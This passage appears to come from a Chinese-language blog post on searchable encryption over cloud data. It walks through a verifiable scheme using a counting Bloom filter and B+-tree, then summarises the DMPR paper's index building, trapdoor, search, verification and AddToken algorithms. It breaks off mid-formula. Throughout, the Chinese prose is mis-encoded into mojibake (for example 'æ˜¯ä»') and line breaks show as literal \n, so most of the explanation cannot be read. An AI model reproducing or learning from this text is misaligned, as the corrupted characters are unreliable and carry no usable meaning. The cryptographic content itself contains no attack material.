Ï„<sub>Ï‰</sub> æ˜¯ä»æ–‡ä»¶ f ä¸­æå–çš„ç‰¹å®šå…³é”®å­—çš„æ ‡è®°ï¼ŒG<sub>K2</sub>(f) æ˜¯ f çš„ä¼ªéšæœºå­—ç¬¦ä¸²ã€‚\n\näº‘æœåŠ¡å™¨æ ¹æ®å…¶ token å’Œå€¼ {IH<sub>K<sub>2</sub></sub>(f) }æ‰¾åˆ°å¯¹åº”çš„å¶èŠ‚ç‚¹ã€‚å¦‚æœä»¤ç‰Œæ²¡æœ‰å¯¹åº”çš„å¶èŠ‚ç‚¹ï¼Œåˆ™ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„å¶èŠ‚ç‚¹ã€‚è®¡æ•°å¸ƒå¢å§†æ»¤æ³¢å™¨ä¸­ç›¸åº”çš„ä½ä¹Ÿéœ€è¦å¢åŠ 1(è§å›¾5)ã€‚éªŒè¯å™¨Ï€bfå’ŒÏ€ä¹Ÿéœ€è¦æ ¹æ®æ•°æ®è¿›è¡Œæ›´æ–°\n\n\n\n#### æ–¹æ¡ˆç¤ºä¾‹\n\nå‡è®¾æœ‰ 9 ä¸ªæ–‡ä»¶éœ€è¦åˆå§‹åŒ–ï¼Œå³ D = {f<sub>1</sub>ã€f<sub>2</sub>ã€f<sub>3</sub>ã€f<sub>4</sub>ã€f<sub>5</sub>ã€f<sub>6</sub>ã€f<sub>7</sub>ã€f<sub>8</sub>ã€f<sub>9</sub>}ï¼Œå…¶ä¸­åŒ…å« 9 ä¸ªå…³é”®å­—\n\n**å€’æ’ç´¢å¼•**\n\n<img src=\"https://img.jwt1399.top/img/202206211855312.png\" style=\"zoom:50%;\" />\n\næ•°æ®æ‰€æœ‰è€…å°†æ‰€æœ‰ token æ•£åˆ—åˆ° CBFï¼Œå¹¶ç”Ÿæˆ Ï€<sub>bf</sub> å’ŒéªŒè¯å™¨ Ï€ã€‚\n\n**å®‰å…¨ç´¢å¼•**\n\né€šè¿‡å°† (token-value) é”®å€¼å¯¹æ’å…¥åˆ° B<sup>+</sup>-Tree ä¸­æ¥æ„å»ºå®‰å…¨ç´¢å¼•\n\n![](https://img.jwt1399.top/img/202206211855816.png)\n\n**æ›´æ–°**\n\næ·»åŠ æ–°æ–‡ä»¶ f<sub>10</sub> = {Ï‰<sub>5</sub>ï¼ŒÏ‰<sub>10</sub>}ï¼Œæ›´æ–° token å’Œ value åˆ†åˆ«ä¸º [' 4af8 'ï¼ŒIH(GK2(f10))]å’Œ[' ff56 'ï¼ŒIH(GK2(f10))]ã€‚\n\n- å¯¹äºå·²ç»å­˜åœ¨çš„ token '4af8'ï¼ŒæœåŠ¡å™¨éœ€è¦åœ¨åŸå§‹èŠ‚ç‚¹ä¹‹åæ·»åŠ  IH(GK2(f10))ã€‚\n\n- å¯¹äºæ–° token 'ff56'ï¼ŒæœåŠ¡å™¨éœ€è¦åˆ›å»ºä¸€ä¸ªæ–°èŠ‚ç‚¹ï¼Œå¹¶ç»™å®ƒåˆ†é…ä¸€ä¸ªæ–°å€¼ IH(GK2(f10))ã€‚\n\n- æ•°æ®æ‰€æœ‰è€…éœ€è¦éªŒè¯ Ï€<sub>bf</sub> å’Œ Ï€\n\n**æŸ¥è¯¢**\n\nå‡è®¾ç”¨æˆ·æƒ³è¦æŸ¥è¯¢å…³é”®å­— Ï‰<sub>3</sub> å¹¶æäº¤ç›¸åº”çš„ token '30ba'\n\n- æœåŠ¡å™¨æ”¶åˆ°ç”¨æˆ·çš„ token åï¼Œé¦–å…ˆæµ‹è¯•è¯¥ token æ˜¯å¦å­˜åœ¨äº CBF ä¸­\n\n- å¦‚æœå­˜åœ¨ï¼ŒæœåŠ¡å™¨å°†å‘ç”¨æˆ·æœç´¢å®ƒã€‚è¯¥ token çš„æœç´¢è·¯å¾„ä¸º { IN1, LN2 }ï¼Œæœç´¢åˆ—è¡¨ä¸ºÏ = [M<sub>r2</sub>,M<sub>r1</sub>,M<sub>r0</sub>]\n\n- å½“ç”¨æˆ·ä»æœåŠ¡å™¨æ”¶åˆ°ç»“æœåˆ—è¡¨ Ï æ—¶ï¼Œè¿è¡ŒéªŒè¯ç®—æ³•\n\n- ç”¨æˆ·å¯ä»¥æ ¹æ®åˆ—è¡¨ Ï ç”Ÿæˆæ ¹å“ˆå¸Œ\n  - ä¾‹å¦‚ï¼Œå¦‚æœå­˜åœ¨æ”»å‡»ï¼ŒæœåŠ¡å™¨åªè¿”å›æ–‡ä»¶ f3ã€‚ç”¨æˆ·å¯ä»¥é‡æ–°æ„å»ºæ ¹å“ˆå¸Œå€¼ï¼Œè¯¥å“ˆå¸Œå€¼å°†ä¸éªŒè¯å™¨çš„æ ¹ä¸ç›¸åŒã€‚æ‰€ä»¥å®ƒä¼šè¿”å›0ã€‚å¦‚æœå®ƒä»¬ç›¸ç­‰ï¼Œåˆ™è¯æ˜æœåŠ¡å™¨ä¸ºç”¨æˆ·è¿”å›æ­£ç¡®çš„ç»“æœã€‚\n\n\n![](https://img.jwt1399.top/img/202211151614139.png)\n\n\n\nå‡è®¾ç”¨æˆ·æäº¤äº†ä¸€ä¸ªç´¢å¼•ä¸­ä¸å­˜åœ¨çš„ token ï¼Œä¾‹å¦‚ token = '30bb'\n\næœåŠ¡å™¨åªéœ€è¦å‘é€ç»™ç”¨æˆ·ä¸€ä¸ªéªŒè¯è€… Ï€<sub>bf</sub> ã€‚ç”¨æˆ·éªŒè¯ç­¾åï¼Œç„¶åå°†æŸ¥è¯¢åˆ°çš„ token æ•£åˆ—åˆ° CBF' ä¸­ã€‚é€šè¿‡æ¯”è¾ƒéªŒè¯è€… Ï€<sub>bf</sub> ä¸­è§£å¯†çš„ CBF' å’Œ CBFï¼ŒéªŒè¯äº†ç»“æœçš„æ­£ç¡®æ€§\n\n## â‘«DMPRæ–¹æ¡ˆ\n\n**è®ºæ–‡åç§°ï¼šã€ŠDynamic Multi-Phrase Ranked Search over Encrypted Data with Symmetric Searchable Encryptionã€‹**\n\n- ä½œè€…ï¼šéƒ­æˆ; é™ˆé›ª; è‹±é»˜æ°; å‚…å¼ æ°; ææ˜åˆ; å†¯æ–Œ\n- å•ä½ï¼šå¤§è¿ç†å·¥å¤§å­¦\n- ä¼šè®®ï¼š[IEEE Transactions on Services Computing](https://ieeexplore.ieee.org/document/8089767)ã€CCF Bã€‘\n- æ—¶é—´ï¼š2017å¹´10æœˆ\n\n| å¤šå…³é”®å­— | æ¨¡ç³Šæœç´¢ | å¯éªŒè¯ | åŠ¨æ€æ›´æ–° | æ’å |\n| :------: | :------: | :----: | :------: | :--: |\n|    âœ…     |    âŒ     |   âœ…    |    âœ…     |  âœ…   |\n\n### 1ã€æ€»ä½“æ€è·¯\n\næœ¬æ–‡æå‡ºäº†**ä¸€ç§å¯¹åŠ å¯†äº‘æ•°æ®çš„å¤šçŸ­è¯­æ’åæœç´¢**ï¼Œè¯¥æœç´¢è¿˜**æ”¯æŒåŠ¨æ€æ›´æ–°**æ“ä½œã€‚ä½¿ç”¨**å€’æ’ç´¢å¼•**æ¥è®°å½•å…³é”®å­—çš„ä½ç½®ï¼Œå¹¶åˆ¤æ–­è¯¥çŸ­è¯­æ˜¯å¦å‡ºç°ã€‚æ­¤ç´¢å¼•å¯ä»¥æœ‰æ•ˆåœ°æœç´¢å…³é”®å­—ã€‚ä¸ºäº†å¯¹ç»“æœè¿›è¡Œæ’åå¹¶ä¿æŠ¤ç›¸å…³æ€§è¯„åˆ†çš„éšç§æ€§ï¼Œåœ¨å®¢æˆ·ç«¯çš„æœç´¢è¿‡ç¨‹ä¸­é‡‡ç”¨äº†**ç›¸å…³æ€§è¯„åˆ†è¯„ä¼°æ¨¡å‹**ã€‚æ­¤å¤–ï¼Œç´¢å¼•çš„ç‰¹æ®Šæ„é€ ä½¿æ–¹æ¡ˆå…·æœ‰åŠ¨æ€æ€§ã€‚æ•°æ®æ‰€æœ‰è€…å¯ä»¥ä»¥éå¸¸ä½çš„æˆæœ¬æ›´æ–°äº‘æ•°æ®ã€‚é€šè¿‡å®‰å…¨åˆ†æå’Œå¹¿æ³›å®éªŒï¼ŒéªŒè¯äº†æ‰€ææ–¹æ¡ˆçš„å®‰å…¨æ€§å’Œæœ‰æ•ˆæ€§ã€‚\n\n- æœ¬æ–‡ä¸­è¦è§£å†³çš„é—®é¢˜æ˜¯å¦‚ä½•è®¾è®¡ä¸€ä¸ª**æ”¯æŒåŠ¨æ€**ã€**å¤šçŸ­è¯­**ã€**æ’åæœç´¢**çš„å¯æœç´¢åŠ å¯†ç³»ç»Ÿã€‚\n\n- å¤šçŸ­è¯­æ’åæœç´¢å¯ä»¥**æŒ‰ç›¸å…³æ€§æ¡ä»¶çš„æ’åé¡ºåºè¿”å›æ–‡ä»¶**ã€‚æ’åæœç´¢æé«˜äº†ä¼ ç»Ÿæœç´¢æ–¹æ³•çš„å®ç”¨æ€§ã€‚\n\n- è¯¥æ–¹æ¡ˆæ˜¯è½»é‡çº§çŸ­è¯­å¯¹ç§°å¯æœç´¢åŠ å¯†ï¼ˆLPSSEï¼‰å’ŒåŠ¨æ€å¯¹ç§°å¯æœç´¢åŠ å¯†ï¼ˆDSSEï¼‰çš„æ‰©å±•\n\n### 2ã€ä½¿ç”¨æŠ€æœ¯\n\n- å€’æ’ç´¢å¼•\n- TF-IDF \n\n### 3ã€æ–¹æ¡ˆæ¦‚è¿°\n\nåŠ¨æ€å¤šçŸ­è¯­æ’åå¯æœç´¢åŠ å¯†æ–¹æ¡ˆåŒ…å«ä¹ç§ç®—æ³•ï¼ˆ**KeyGenï¼ŒTrapdoorï¼ŒBuildIndexï¼ŒSearchï¼ŒVerifyï¼ŒAddTokenï¼ŒAddï¼ŒDeleteTokenå’ŒDelete**ï¼‰ã€‚è¯¥æ–¹æ¡ˆç”±å››ä¸ªé˜¶æ®µçš„ä¹ç§ç®—æ³•ç»„æˆ\n\n#### Setup\n\næ•°æ®æ‰€æœ‰è€…æ‰§è¡Œ **KeyGen** å’Œ **BuildIndex** æ¥åˆå§‹åŒ–ç´¢å¼• I\n\né¦–å…ˆï¼Œæ•°æ®æ‰€æœ‰è€…é€šè¿‡æ‰§è¡Œç®—æ³• KeyGen ç”Ÿæˆå¯†é’¥ï¼Œè¿™äº›å¯†é’¥ç”¨äºåŠ å¯†æ–‡ä»¶é›†åˆ F å¹¶æ„å»ºç´¢å¼• I\n\nç„¶åï¼Œæ•°æ®æ‰€æœ‰è€…ä½¿ç”¨ BuildIndex å¤„ç†æ–‡ä»¶é›†åˆï¼Œæ•°æ®æ‰€æœ‰è€…æ”¶é›†æœ‰å…³æ–‡ä»¶ä¸­å…³é”®å­—çš„ä¿¡æ¯ï¼Œå¹¶ä»¥å®‰å…¨çš„æ–¹å¼å°†å…¶å­˜å‚¨åœ¨ç´¢å¼•ä¸­ã€‚\n\nåœ¨ Setup é˜¶æ®µï¼Œæ•°æ®æ‰€æœ‰è€…è¿˜åº”ä¸ä¸€ç»„æˆæƒæ•°æ®ç”¨æˆ·å…±äº«å¿…è¦çš„å¯†é’¥ï¼ˆä¾‹å¦‚ï¼Œåœ¨æœ¬ä¾‹ä¸­ä¸ºç”¨äºç”Ÿæˆæœç´¢ä»¤ç‰Œçš„å¯†é’¥ï¼‰\n\n#### Retrieval\n\næ•°æ®ç”¨æˆ·ä½¿ç”¨ **Trapdoor** ç”Ÿæˆä¸å¾…æœç´¢çŸ­è¯­ç›¸å¯¹åº”çš„å®‰å…¨æœç´¢ä»¤ç‰Œï¼Œå¹¶å°†å…¶å‘é€åˆ°äº‘æœåŠ¡å™¨ã€‚\n\nå½“äº‘æœåŠ¡å™¨æ”¶åˆ°æœç´¢ä»¤ç‰Œæ—¶ï¼Œå®ƒå°†æœç´¢ç´¢å¼• I ï¼Œå¹¶è·å–æœ‰å…³å€™é€‰æ–‡ä»¶çš„ä¸€ç»„ä¿¡æ¯ã€‚\n\næœ¯è¯­â€œå€™é€‰æ–‡ä»¶â€æ˜¯æŒ‡æ„æˆè¿™äº›æ–‡ä»¶ä¸­æ˜¾ç¤ºçš„çŸ­è¯­çš„å•è¯ã€‚åœ¨æ­¤é˜¶æ®µï¼Œäº‘æœåŠ¡å™¨ä»…è¿”å›ç´¢å¼•çš„éƒ¨åˆ†ä¿¡æ¯ I åˆ°æ•°æ®ç”¨æˆ·ã€‚\n\n#### Verify\n\nå½“ä»äº‘æœåŠ¡å™¨æ¥æ”¶ä¿¡æ¯æ—¶ï¼Œæ•°æ®ç”¨æˆ·å°†ä½¿ç”¨ Verify éªŒè¯ç›®æ ‡çŸ­è¯­æ˜¯å¦å‡ºç°åœ¨è¿™äº›æ–‡ä»¶ä¸­ã€‚\n\nåœ¨æ­¤è¿‡ç¨‹ä¸­ï¼Œæ•°æ®ç”¨æˆ·å°†æ£€æŸ¥æ„æˆçŸ­è¯­çš„å…³é”®å­—æ˜¯å¦è¿ç»­å‡ºç°åœ¨æ–‡ä»¶ä¸­ã€‚\n\nè¿˜å°†è®¡ç®—çŸ­è¯­çš„ TF-IDF å¹¶å¯¹ç»“æœè¿›è¡Œæ’åï¼Œæ ¹æ®æ’åç»“æœï¼Œæ•°æ®ç”¨æˆ·å¯ä»¥å‘äº‘æœåŠ¡å™¨è¯¢é—®æ„Ÿå…´è¶£çš„æ–‡ä»¶ã€‚\n\n#### Update\n\nå½“æ•°æ®æ‰€æœ‰è€…æƒ³è¦å°†æ–‡ä»¶æ·»åŠ åˆ°æ–‡ä»¶é›†åˆæˆ–ä»ä¸­åˆ é™¤æ–‡ä»¶æ—¶ï¼Œé¦–å…ˆï¼Œä»–åº”è¯¥ç”Ÿæˆ addToken æˆ– deleteToken å¹¶å°†å…¶å‘é€åˆ°äº‘æœåŠ¡å™¨ã€‚å½“äº‘æœåŠ¡å™¨æ”¶åˆ° Token æ—¶ï¼Œå®ƒå°†æ›´æ–°ç´¢å¼• I å’Œæ–‡ä»¶é›†åˆ C é€šè¿‡æ‰§è¡Œâ€œAdd or Deleteâ€ã€‚\n\n### 4ã€æ–¹æ¡ˆå®ç°\n\n#### Kâ†Keygen(1<sup>k</sup>)\n\n- K = (xï¼Œyï¼Œzï¼Œsï¼Œr)â† {0, 1}<sup>k</sup>\n\n#### (I,C)â†BuildIndex(F,k)\n\n`ç´¢å¼• I` ä¸»è¦ç”±**æœç´¢åˆ—è¡¨ A<sub>s</sub>** å’Œ**æ›´æ–°åˆ—è¡¨ A<sub>u</sub>** ç»„æˆï¼Œ**æœç´¢è¡¨ T<sub>s</sub>** å’Œ**æ›´æ–°è¡¨ T<sub>u</sub>** ç”¨äºç¡®å®šåˆ—è¡¨çš„å¤´éƒ¨\n\næ•°æ®æ‰€æœ‰è€…æœ‰ä¸€ä¸ªæ–‡ä»¶é›†åˆ F = (f<sub>1</sub>ï¼Œf<sub>2</sub>ï¼Œ...ï¼Œf<sub>n</sub>) å’Œå…³é”®å­—é›†åˆ W = (w<sub>1</sub>ï¼Œw<sub>2</sub>ï¼Œ...ï¼Œw<sub>m</sub>)ï¼Œæœç´¢åˆ—è¡¨ A<sub>s</sub> å’Œæœç´¢è¡¨ T<sub>s</sub> ç”¨äºæœç´¢æ“ä½œã€‚\n\n- å¯¹äºæ¯ä¸ªå…³é”®å­— w<sub>i</sub> âˆˆ Wï¼Œéƒ½æœ‰ä¸€ä¸ªä¸ä¹‹ç›¸å…³è”çš„åˆ—è¡¨ L<sub>w<sub>i</sub></sub>ï¼Œåˆ—è¡¨ä¸­çš„èŠ‚ç‚¹æ•°ä¸º |F<sub>wi</sub>|\n\n- å¦‚æœæœ‰ä¸€ä¸ªæ–‡ä»¶åŒ…å«å…³é”®å­— w<sub>i</sub> ï¼Œæˆ‘ä»¬å°†åœ¨åˆ—è¡¨ L<sub>w<sub>i</sub></sub> ä¸­æ·»åŠ ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä¸ºäº†æ‰¾åˆ°åˆ—è¡¨ L<sub>w<sub>i</sub></sub> çš„å¤´éƒ¨ï¼Œæˆ‘ä»¬å°†å¤´éƒ¨çš„åœ°å€å­˜å‚¨åœ¨æœç´¢è¡¨ T<sub>s</sub> ä¸­ã€‚\n\n- ä¸ºäº†é«˜æ•ˆåœ°æ›´æ–°æ–‡ä»¶é›†åˆï¼Œæˆ‘ä»¬ä½¿ç”¨æ›´æ–°åˆ—è¡¨ A<sub>u</sub> å’Œæ›´æ–°è¡¨ T<sub>u</sub>ï¼Œå¯¹äºæ¯ä¸ªæ–‡ä»¶ f<sub>j</sub> âˆˆ Fï¼Œæˆ‘ä»¬å»ºç«‹ä¸€ä¸ªåˆ—è¡¨ L<sub>f<sub>j</sub></sub> æ¥è®°å½•å…¶ä¸­æ‰€æœ‰ä¸åŒçš„å•è¯ã€‚ä½¿ç”¨æ›´æ–°åˆ—è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ–°ç´¢å¼•ï¼Œè€Œä¸éœ€è¦é‡æ–°æ„å»ºæ•´ä¸ªç´¢å¼•ã€‚\n\n\n![](https://img.jwt1399.top/img/202206211856909.png)\n\n- 1.è®¾ T<sub>s</sub> å’Œ T<sub>u</sub> æ˜¯å¤§å°ä¸º |W| å’Œ |F| çš„å­—å…¸\n\n- 2.å¯¹äºå…³é”®å­— w<sub>i</sub> âˆˆ W\n- a>äº§ç”Ÿ k<sub>i,0</sub> â† {0,1}<sup>l</sup>\n  \n- b>åˆ›å»º |F<sub>w</sub>| ä¸ªèŠ‚ç‚¹çš„ L<sub>wi</sub> åˆ—è¡¨ (N<sub>1</sub>, N<sub>2</sub>, ..., N<sub>|F<sub>w</sub>|</sub>)ï¼Œæ¯ä¸ªèŠ‚ç‚¹ value = N<sub>k<sub>i,j-1</sub></sub>(g<sub>x</sub>(w<sub>i</sub>) || id(f<sub>j</sub>) || Ï€<sub>s</sub>(loc) || Ï†<sub>z</sub>(addr+1) || k<sub>i,j</sub>)ï¼Œå¹¶å°† value å­˜å‚¨åœ¨ A<sub>s</sub>[(Ï†<sub>z</sub>(addr)]\n  \n  - **id(f<sub>j</sub>)**  æ˜¯æ–‡ä»¶ f<sub>j</sub> çš„æ ‡è¯†ç¬¦\n  \n  - **Ï€<sub>s</sub>(loc)**  æ˜¯ w<sub>i</sub> åœ¨æ–‡ä»¶ f<sub>j</sub> ä¸­çš„æ‰€æœ‰ä½ç½® \n  \n  - **Ï†<sub>z</sub>(addr+1)** æ˜¯ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„ç´¢å¼•\n  \n  - æœ€åä¸€ä¸ªèŠ‚ç‚¹ N<sub>|F<sub>w</sub>|</sub>ï¼Œvalue ä¸º Ï†<sub>z</sub>(addr+1) è®¾ç½®ä¸ºæ— æ•ˆå€¼ã€‚\n    - c>åœ¨æœç´¢è¡¨ T<sub>s</sub> ä¸­ï¼Œå­˜å‚¨ value ä¸º (g<sub>x</sub>(w<sub>i</sub>) , <Ï†<sub>z</sub>(addr) || k<sub>i,0</sub> > âŠ• f<sub>y</sub>(w<sub>i</sub>))ï¼Œå…¶ä¸­ Ï†<sub>z</sub>(addr) æ˜¯åˆ—è¡¨ L<sub>wiÂ </sub>çš„å¤´èŠ‚ç‚¹ä½ç½®\n\n- 3.å¯¹äºåœ¨ F ä¸­çš„æ–‡ä»¶ f<sub>i</sub> \n  - a>äº§ç”Ÿ k<sub>i,0</sub> â† {0,1}<sup>l</sup>\n  \n  - b>åˆ›å»ºåŒ…å« | f<sub>i</sub> | èŠ‚ç‚¹çš„åˆ—è¡¨ L<sub>f<sub>i</sub></sub>ï¼Œå®šä¹‰ value =  N<sub>k<sub>i,j-1</sub></sub>(g<sub>x</sub>(id(f<sub>i</sub>)) || g<sub>x</sub>(w<sub>j</sub>) || f<sub>y</sub>(w<sub>j</sub>) || Ï†<sub>z</sub>(addr+1) || k<sub>i,j</sub>)ï¼Œå¹¶å°† value å­˜å‚¨åœ¨ A<sub>u</sub>[(Ï†<sub>z</sub>(addr)]\n  \n  - c>åœ¨æ›´æ–°è¡¨ T<sub>u</sub> ä¸­å­˜å‚¨ (g<sub>x</sub>(id(f<sub>i</sub>)), <Ï†<sub>z</sub>(addr) || k<sub>i,0</sub>> âŠ• f<sub>y</sub>(id(f<sub>i</sub>))) \n  \n- 4.ä½¿ç”¨ç§é’¥åŠ å¯† F ä¸­çš„æ¯ä¸ªæ–‡ä»¶ fï¼Œå¾—åˆ° C\n\n- 5.è¾“å‡º(I,C)ï¼Œå…¶ä¸­ I å®šä¹‰ä¸º (T<sub>s</sub>ï¼ŒA<sub>s</sub>ï¼ŒT<sub>u</sub>ï¼ŒA<sub>u</sub>)ï¼Œ C å®šä¹‰ä¸º (c<sub>1</sub>ï¼Œc<sub>2</sub>ï¼Œ. . . ï¼Œ c<sub>n</sub>)\n\n#### T<sub>p</sub> â† Trapdoor(phrase,K)\n\n- 1.è§£æçŸ­è¯­ä¸º (w<sub>1</sub>ï¼Œw<sub>2</sub>ï¼Œ. . . ,  w<sub>p</sub>)\n\n- 2.å¯¹äºå…³é”®å­— w<sub>i</sub> âˆˆ phraseï¼ŒT<sub>w<sub>i</sub></sub> = (g<sub>x</sub>(w<sub>i</sub>), f<sub>y</sub>(w<sub>i</sub>))\n- 3.è¾“å‡º T<sub>p</sub> = (T<sub>w<sub>1</sub></sub>, T<sub>w<sub>2</sub></sub>, ..., T<sub>w<sub>p</sub></sub>)\n\n####  infoâ†Search(I,T<sub>p</sub>)\n\n- 1.å¦‚æœ ï½œphraseï½œ = 1 \n  - a>è§£æ T<sub>p</sub> ä¸º (Î±, Î²)\n  - b>åœ¨æœç´¢è¡¨ T<sub>s</sub> ä¸­æœç´¢ Î±\n  - c>è®¾<â„‡ || *k*> = T<sub>s</sub>[Î±] âŠ• Î²\n  - d>ä½¿ç”¨å¯†é’¥ *k* è§£å¯†èŠ‚ç‚¹ A<sub>s</sub>[â„‡] ï¼Œç„¶åé€ä¸ªè§£å¯†åˆ—è¡¨ä¸­çš„èŠ‚ç‚¹\n  - e>å°†åˆ—è¡¨ä¸­åŒ…å«çš„èŠ‚ç‚¹è¾“å‡ºä¸º info\n\n- 2.å¦‚æœ ï½œphraseï½œ > 1 \n  - a>è§£æ T<sub>p</sub> ä¸º (T<sub>w<sub>1</sub></sub>ï¼ŒT<sub>w<sub>2</sub></sub>ï¼Œ...ï¼ŒT<sub>w<sub>p</sub></sub>)\n  - b>å¯¹äº T<sub>w<sub>i</sub></sub> âˆˆ T<sub>p</sub>ï¼Œæ‰§è¡Œï¼ˆ1ï¼‰ï¼Œå¹¶è·å–åˆ—è¡¨ä¸­åŒ…å«çš„æ‰€æœ‰èŠ‚ç‚¹\n  - c>å°†åˆ—è¡¨ä¸­åŒ…å«çš„èŠ‚ç‚¹è¾“å‡ºä¸º info\n\nå¦‚æœæˆ‘ä»¬å‡è®¾æ•°æ®ç”¨æˆ·æƒ³è¦æœç´¢ä¸€ä¸ªçŸ­è¯­ p = (w<sub>1</sub>, w<sub>2</sub>)\n\n- é¦–å…ˆï¼Œç”Ÿæˆä¸€ä¸ªæœç´¢ä»¤ç‰Œ T<sub>p</sub> = (T<sub>w<sub>1</sub></sub>, T<sub>w<sub>2</sub></sub>)ï¼Œå…¶ä¸­ T<sub>w<sub>i</sub></sub> = {g<sub>x</sub>(w<sub>i</sub>)ï¼Œf<sub>y</sub>(w<sub>i</sub>)}\n- T<sub>w<sub>1</sub></sub> =  {g<sub>x</sub>(w<sub>1</sub>)ï¼Œf<sub>y</sub>(w<sub>1</sub>)} = (Î±<sub>1</sub>, Î²<sub>1</sub>)ã€T<sub>w<sub>2</sub></sub> =  {g<sub>x</sub>(w<sub>2</sub>), f<sub>y</sub>(w<sub>2</sub>)} = (Î±<sub>2</sub>, Î²<sub>2</sub>)\n- åœ¨æœç´¢è¡¨ T<sub>s</sub> ä¸­æœç´¢ Î±<sub>1</sub> å’Œ Î±<sub>2</sub>ï¼Œè®¡ç®— <â„‡<sub>1</sub> || *k*> = T<sub>s</sub>[Î±<sub>1</sub>] âŠ• Î²<sub>1</sub> å’Œ  <â„‡<sub>2</sub> || *k*> = T<sub>s</sub>[Î±<sub>2</sub>] âŠ• Î²<sub>2</sub>ï¼Œ\n  - å³ <Ï†<sub>z</sub>(addr<sub>1</sub>) || k<sub>1,0</sub>> = T<sub>s</sub>[g<sub>x</sub>(w<sub>1</sub>)] âŠ• f<sub>y</sub>(w<sub>1</sub>) å’Œ <Ï†<sub>z</sub>(addr<sub>2</sub>) || k<sub>2,0</sub>> = T<sub>s</sub>[g<sub>x</sub>(w<sub>2</sub>)] âŠ• f<sub>y</sub>(w<sub>2</sub>) \n\n- æœåŠ¡å™¨åœ¨ A<sub>s</sub> ä¸­æ‰¾åˆ°å¯¹åº”åˆ—è¡¨ L<sub>w<sub>1</sub></sub> = A<sub>s</sub>[â„‡<sub>1</sub>]  å’Œ L<sub>w<sub>2</sub></sub> = A<sub>s</sub>[â„‡<sub>2</sub>] \n- ç„¶åï¼ŒæœåŠ¡å™¨è§£å¯† L<sub>w<sub>1</sub></sub> å’Œ L<sub>w<sub>2</sub></sub> åˆ—è¡¨çš„æ‰€æœ‰èŠ‚ç‚¹ï¼Œå¹¶è¿”å›æ–‡ä»¶åŒ…å« w<sub>1Â </sub>å’Œ w<sub>2Â </sub>ä¸¤è€…çš„èŠ‚ç‚¹ info\n\n#### I<sub>p</sub>â†Verify(info,T<sub>p</sub>)\n\n- 1.è§£æ info ä¸º (L<sub>1</sub>ï¼ŒL<sub>2</sub>ï¼Œ. . . ï¼Œ L<sub>|phrase|</sub>)\n\n- 2.å¯¹äº L<sub>iÂ </sub>âˆˆ infoï¼Œè§£å¯†èŠ‚ç‚¹å¹¶è·å–å…³é”®å­—çš„ä½ç½® Ï€<sub>s</sub>(loc)\n- 3.å¦‚æœçŸ­è¯­ä¸­çš„å…³é”®å­—åœ¨åŒä¸€ä¸ªæ–‡ä»¶ f ä¸­è¿ç»­å‡ºç°ï¼Œåˆ™å°†æ–‡ä»¶æ ‡è¯†ç¬¦æ·»åŠ åˆ° I<sub>p</sub>ï¼Œç”¨é¢‘ç‡æ¥è®¡ç®—çŸ­è¯­å‡ºç°çš„æ¬¡æ•°\n  - I<sub>p</sub> è¡¨ç¤ºåŒ…å«çŸ­è¯­ p çš„æ–‡ä»¶æ ‡è¯†ç¬¦\n\n- 4.å¯¹äº I<sub>p</sub> ä¸­çš„æ¯ä¸ªæ–‡ä»¶ï¼Œç”¨é¢‘ç‡å’Œæ–‡ä»¶é•¿åº¦è®¡ç®— TF-IDF å€¼ï¼Œå¹¶åœ¨ I<sub>pÂ </sub>ä¸­æ’åºã€‚\n- 5.è¾“å‡ºæ’åºåçš„ç»“æœ I<sub>p</sub>\n\nå½“æ•°æ®ç”¨æˆ·æ”¶åˆ°èŠ‚ç‚¹çš„ä¿¡æ¯æ—¶ï¼Œå°†ç”¨å®ƒä»¬æ¥æŸ¥æ‰¾åŒ…å«çŸ­è¯­ p çš„æ–‡ä»¶ï¼Œè¿™é‡Œå‡è®¾çŸ­è¯­ p å‡ºç°åœ¨ f<sub>1</sub>ï¼Œf<sub>2</sub> å’Œ f<sub>3</sub> ä¸­ã€‚æ•°æ®ä½¿ç”¨è€…è®¡ç®—çŸ­è¯­ p åœ¨ f<sub>1</sub>, f<sub>2</sub> å’Œ f<sub>3</sub> ä¸­çš„ç›¸å…³æ€§å¾—åˆ†ã€‚\n\n![](https://img.jwt1399.top/img/202206211856699.png)\n\nç”±è¡¨å¯çŸ¥ï¼Œç›¸å…³å¾—åˆ†åˆ†åˆ«ä¸º 2.17ã€5.21 å’Œ 3.43ã€‚æ•°æ®ç”¨æˆ·å¯ä»¥æ ¹æ®è¿™äº›ç›¸å…³æ€§å¾—åˆ†å¯¹æ–‡ä»¶è¿›è¡Œæ’åºï¼Œå¹¶è·å¾—æ’åºç»“æœã€‚ä»è¡¨ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“ f<sub>2Â </sub>æ˜¯ä¸æŸ¥è¯¢è¯·æ±‚æœ€ç›¸å…³çš„æ–‡ä»¶ï¼Œè€Œ f<sub>1</sub> æ˜¯æœ€ä¸ç›¸å…³çš„æ–‡ä»¶ã€‚æ•°æ®ç”¨æˆ·å¯ä»¥è·å¾—æ’åºç»“æœï¼Œå¹¶ä»æœåŠ¡å™¨è¯·æ±‚æ‰€éœ€çš„æ–‡ä»¶ã€‚\n\n#### (T<sub>a</sub>,c<sub>f</sub>)â†AddToken(f,K)\n\n- 1.è®¾ (w<sub>1</sub>ï¼Œw<sub>2</sub>ï¼Œ. . . ï¼Œw<sub>f</sub>) æ˜¯æ–‡ä»¶ f ä¸­å‡ºç°çš„å…³é”®å­—\n- 2.è®¾ Add token T<sub>a</sub> = (Î±<sub>1</sub>, Î±<sub>2</sub>,  . . . ,  Î±<sub>f</sub>, Î², Î»<sub>1</sub>, . . . , Î»<sub>f</sub>), å¯¹äº i âˆˆ [1, 2, ..., f]\n  - **Î±<sub>i</sub>** ä¸º (g<sub>x</sub>(w<sub>i</sub>), f<sub>y</sub>(w<sub>i</sub>), id(f), Ï€<sub>s</sub>(loc), k<sub>i+1</sub>)\n  - **Î²** ä¸º (g<sub>x</sub>(id(f)), f<sub>y</sub>(id(f)), k<sub>0</sub>)\n  - **Î»<sub>i</sub>** ä¸º (g<sub>x</sub>(id(f)), g<sub>x</sub>(w<sub>i</sub>), f<sub>y</sub>(w<sub>i</sub>), k<sub>i+1</sub>)\n\n- 3.å¯¹äºæ–‡ä»¶ fï¼Œä½¿ç”¨å¯¹ç§°åŠ å¯†æ–¹æ¡ˆå°†å…¶åŠ å¯†ä¸º c<sub>f</sub>\n- 4.è¾“å‡º (T<sub>a</sub>, 